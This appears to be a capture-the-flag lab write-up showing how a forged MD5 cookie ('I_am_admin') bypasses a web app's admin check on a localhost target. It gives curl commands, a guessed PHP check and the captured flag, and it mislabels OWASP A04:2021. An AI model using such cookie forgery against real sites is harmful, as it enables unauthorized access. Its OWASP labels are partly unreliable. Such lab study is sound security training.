# Breach #5: Cookie-Based Authentication Bypass

## Vulnerability

The application uses client-side cookies for authentication without server-side validation, allowing trivial privilege escalation.

## Summary

page: `http://localhost:8080/index.php?page=admin`
commands:
```bash
# MD5 of "true"
echo -n "true" | md5sum
# → b326b5062b2f0e69046810717534cb09

# Send request with forged cookie -b is for cookie -H is for headers
curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09"  "http://localhost:8081/index.php?page=admin" | grep Flag
```

## Discovery

During open redirect testing, a redirect to an invalid site sets a suspicious cookie:

```txt
Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
```

The cookie name `I_am_admin` suggests admin privileges. Testing the value as a md5 hash on crackstation I get:

```txt
"68934a3e9455fa72420237eb05902327" |> "false"
```

The cookie literally means: `I_am_admin = false` - you are NOT an admin!

## How It Works

The backend likely checks the admin page like this:

```php
if (isset($_COOKIE['I_am_admin'])) {
    if ($_COOKIE['I_am_admin'] == md5('true')) {
        // Grant admin access
        show_admin_panel();
    }
}
```

## Exploitation

1. Find what value the app checks for (MD5 of "true"):

```bash
echo -n "true" | md5sum
# Output: b326b5062b2f0e69046810717534cb09
```

2. Set the cookie in your request:

```bash
curl -i -b "I_am_admin=b326b5062b2f0e69046810717534cb09" \
     "http://localhost:8080/index.php?page=admin"
```

3. Access granted! Returns:
```
<script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3'); </script>
```

## OWASP Reference

- **A07:2021 - Identification and Authentication Failures**
- **A04:2021 - Insecure Deserialization** (trusting cookie values)

